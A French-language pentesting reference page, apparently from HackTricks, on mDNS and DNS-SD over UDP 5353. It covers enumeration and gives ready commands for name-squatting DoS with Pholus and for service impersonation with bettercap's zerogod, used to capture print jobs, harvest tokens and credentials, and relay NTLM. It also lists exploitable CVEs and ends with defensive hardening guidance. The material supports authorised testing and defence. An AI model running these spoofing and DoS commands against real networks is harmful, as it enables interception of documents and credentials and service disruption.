# 5353/UDP Multicast DNS (mDNS) et DNS-SD

{{#include ../banners/hacktricks-training.md}}

## Informations de base

Multicast DNS (mDNS) permet une résolution de noms de type DNS et la découverte de services à l'intérieur d'un lien local sans serveur DNS unicast. Il utilise UDP/5353 et les adresses multicast 224.0.0.251 (IPv4) et FF02::FB (IPv6). DNS Service Discovery (DNS-SD, typiquement utilisé avec mDNS) fournit un moyen standardisé d'énumérer et de décrire les services via les enregistrements PTR, SRV et TXT.
```
PORT     STATE SERVICE
5353/udp open  zeroconf
```
Key protocol details you’ll often leverage during attacks:
- Les noms dans la zone .local sont résolus via mDNS.
- Le bit QU (Query Unicast) peut demander des réponses unicast même pour des requêtes multicast.
- Les implémentations devraient ignorer les paquets dont la source n'est pas le lien local ; certaines stacks les acceptent encore.
- Probing/announcing impose l'unicité des noms d'hôtes/services ; interférer ici crée des conditions de DoS/“name squatting”.

## DNS-SD service model

Les services sont identifiés comme _<service>._tcp ou _<service>._udp sous .local, par ex. _ipp._tcp.local (imprimantes), _airplay._tcp.local (AirPlay), _adb._tcp.local (Android Debug Bridge), etc. Découvrez les types avec _services._dns-sd._udp.local, puis résolvez les instances découvertes en SRV/TXT/A/AAAA.

## Network Exploration and Enumeration

- scan nmap d'une cible (mDNS direct sur un hôte) :
```bash
nmap -sU -p 5353 --script=dns-service-discovery <target>
```
- découverte broadcast nmap (écoute du segment et énumération de tous les types/instances DNS-SD) :
```bash
sudo nmap --script=broadcast-dns-service-discovery
```
- avahi-browse (Linux) :
```bash
# List service types
avahi-browse -bt _services._dns-sd._udp
# Browse all services and resolve to host/port
avahi-browse -art
```
- Apple dns-sd (macOS) :
```bash
# Browse all HTTP services
dns-sd -B _http._tcp
# Enumerate service types
dns-sd -B _services._dns-sd._udp
# Resolve a specific instance to SRV/TXT
dns-sd -L "My Printer" _ipp._tcp local
```
- Capture de paquets avec tshark :
```bash
# Live capture
sudo tshark -i <iface> -f "udp port 5353" -Y mdns
# Only DNS-SD service list queries
sudo tshark -i <iface> -f "udp port 5353" -Y "dns.qry.name == \"_services._dns-sd._udp.local\""
```

Astuce : Certains navigateurs/WebRTC utilisent des noms d'hôte mDNS éphémères pour masquer les IP locales. Si vous voyez des candidats random-UUID.local sur le réseau, résolvez-les via mDNS pour effectuer un pivot vers les IP locales.

## Attacks

### Interférence au stade de probing du nom mDNS (DoS / name squatting)

Pendant la phase de probing, un hôte vérifie l'unicité d'un nom. Répondre avec des conflits falsifiés le force à choisir de nouveaux noms ou à échouer. Cela peut retarder ou empêcher l'enregistrement et la découverte des services.

Exemple avec Pholus:
```bash
# Block new devices from taking names by auto-faking responses
sudo python3 pholus3.py <iface> -afre -stimeout 1000
```
### Service spoofing and impersonation (MitM)

Impersonate les services DNS-SD annoncés (imprimantes, AirPlay, HTTP, partages de fichiers) pour contraindre des clients à se connecter à vous. Ceci est particulièrement utile pour :
- Récupérer des documents en spoofing _ipp._tcp ou _printer._tcp.
- Leurrer des clients vers des services HTTP/HTTPS pour récolter tokens/cookies ou livrer payloads.
- Combiner avec NTLM relay lorsque des clients Windows négocient l'auth vers des services spoofed.

Avec le module zerogod de bettercap (mDNS/DNS-SD spoofer/impersonator):
```bash
# Start mDNS/DNS-SD discovery
sudo bettercap -iface <iface> -eval "zerogod.discovery on"

# Show all services seen from a host
> zerogod.show 192.168.1.42
# Show full DNS records for a host (newer bettercap)
> zerogod.show-full 192.168.1.42

# Impersonate all services of a target host automatically
> zerogod.impersonate 192.168.1.42

# Save IPP print jobs to disk while impersonating a printer
> set zerogod.ipp.save_path ~/.bettercap/zerogod/documents/
> zerogod.impersonate 192.168.1.42

# Replay previously captured services
> zerogod.save 192.168.1.42 target.yml
> zerogod.advertise target.yml
```
Voir aussi les workflows génériques de spoofing LLMNR/NBNS/mDNS/WPAD et de capture/relay d'identifiants :

{{#ref}}
../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### Notes sur les problèmes d'implémentation récents (utile pour DoS/persistance lors d'engagements)

- Les bugs Avahi reachable-assertion et D-Bus crash (2023) peuvent terminer avahi-daemon sur des distributions Linux (par ex. CVE-2023-38469..38473, CVE-2023-1981), perturbant la découverte de services sur les hôtes cibles jusqu'au redémarrage.
- Cisco IOS XE Wireless LAN Controller mDNS gateway DoS (CVE-2024-20303) permet à des clients WLAN adjacents d'inonder le contrôleur avec des mDNS fabriqués, provoquant un pic CPU du WLC et la chute des tunnels AP — utile si vous devez forcer le roaming des clients ou des resets de contrôleur pendant un engagement.
- Apple mDNSResponder logic error DoS (CVE-2024-44183) permet à un processus local sandboxé de planter Bonjour pour supprimer brièvement la publication/la découverte de services sur des endpoints Apple ; corrigé dans les versions iOS/macOS courantes.
- Apple mDNSResponder correctness issue (CVE-2025-31222) a permis une élévation de privilèges locale via mDNSResponder ; utile pour la persistance sur Macs/iPhones non gérés, corrigé dans les récents correctifs iOS/macOS.

### Considérations Browser/WebRTC mDNS

Les versions récentes de Chromium/Firefox rendent opaques les host candidates avec des noms mDNS aléatoires. Vous pouvez ré-exposer les IP LAN sur des endpoints gérés en poussant la policy Chrome `WebRtcLocalIpsAllowedUrls` (ou en basculant `chrome://flags/#enable-webrtc-hide-local-ips-with-mdns`/équivalent Edge) de sorte que ICE expose les host candidates au lieu de mDNS ; définir via `HKLM\Software\Policies\Google\Chrome`.

Quand les utilisateurs désactivent la protection manuellement (courant dans les guides de dépannage WebRTC), leurs navigateurs recommencent à annoncer des host candidates en clair, que vous pouvez capturer via mDNS ou ICE signaling pour accélérer la découverte d'hôtes.

## Considérations défensives et OPSEC

- Limites de segmentation : ne routez pas 224.0.0.251/FF02::FB entre zones de sécurité sauf si un mDNS gateway est explicitement requis. Si vous devez relier la découverte, privilégiez des allowlists et des limites de débit.
- Endpoints/serveurs Windows :
- Pour désactiver totalement la résolution de noms via mDNS, définissez la valeur de registre et redémarrez :
```
HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableMDNS = 0 (DWORD)
```
- Dans des environnements gérés, désactivez la règle intégrée « mDNS (UDP-In) » de Windows Defender Firewall (au moins sur le profil Domaine) pour empêcher le traitement mDNS entrant tout en préservant la fonctionnalité à domicile/nomade.
- Sur les builds Windows 11 récents/templates GPO, utilisez la policy “Computer Configuration > Administrative Templates > Network > DNS Client > Configure multicast DNS (mDNS) protocol” et définissez-la sur Disabled.
- Linux (Avahi) :
- Restreignez la publication lorsque ce n'est pas nécessaire : définissez `disable-publishing=yes`, et restreignez les interfaces avec `allow-interfaces=` / `deny-interfaces=` dans `/etc/avahi/avahi-daemon.conf`.
- Envisagez `check-response-ttl=yes` et évitez `enable-reflector=yes` sauf si strictement nécessaire ; préférez des allowlists `reflect-filters=` lors de la réflexion.
- macOS : restreignez le mDNS entrant au niveau des firewalls hôte/réseau lorsque la découverte Bonjour n'est pas nécessaire pour certains sous-réseaux.
- Monitoring : alertez sur des pics inhabituels de requêtes `_services._dns-sd._udp.local` ou des changements soudains de SRV/TXT de services critiques ; ce sont des indicateurs de spoofing ou d'usurpation de service.

## Référence rapide des outils

- nmap NSE: `dns-service-discovery` et `broadcast-dns-service-discovery`.
- Pholus: scan actif, balayages mDNS inverses, helpers DoS et spoofing.
```bash
# Passive sniff (timeout seconds)
sudo python3 pholus3.py <iface> -stimeout 60
# Enumerate service types
sudo python3 pholus3.py <iface> -sscan
# Send generic mDNS requests
sudo python3 pholus3.py <iface> --request
# Reverse mDNS sweep of a subnet
sudo python3 pholus3.py <iface> -rdns_scanning 192.168.2.0/24
```
- bettercap zerogod: discover, save, advertise, and impersonate mDNS/DNS-SD services (see examples above).

## Spoofing/MitM

L'attaque la plus intéressante que vous pouvez réaliser via ce service est d'effectuer un MitM dans la communication entre le client et le vrai serveur. Vous pourriez obtenir des fichiers sensibles (MitM de la communication avec l'imprimante) ou même des identifiants (Windows authentication).\
Pour plus d'informations, consultez :

{{#ref}}
../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Références

- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://books.google.co.uk/books/about/Practical_IoT_Hacking.html?id=GbYEEAAAQBAJ&redir_esc=y)
- [Nmap NSE: broadcast-dns-service-discovery](https://nmap.org/nsedoc/scripts/broadcast-dns-service-discovery.html)
- [bettercap zerogod (mDNS/DNS-SD discovery, spoofing, impersonation)](https://www.bettercap.org/modules/ethernet/zerogod/)
- [Cisco IOS XE WLC mDNS gateway DoS (CVE-2024-20303) advisory](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-wlc-mdns-dos-4hv6pBGf.html)
- [Rapid7 advisory for Apple mDNSResponder CVE-2024-44183](https://www.rapid7.com/db/vulnerabilities/apple-mdnsresponder-cve-2024-44183/)
- [Rapid7 writeup of Apple mDNSResponder CVE-2025-31222](https://www.rapid7.com/db/vulnerabilities/apple-osx-mdnsresponder-cve-2025-31222/)

{{#include ../banners/hacktricks-training.md}}
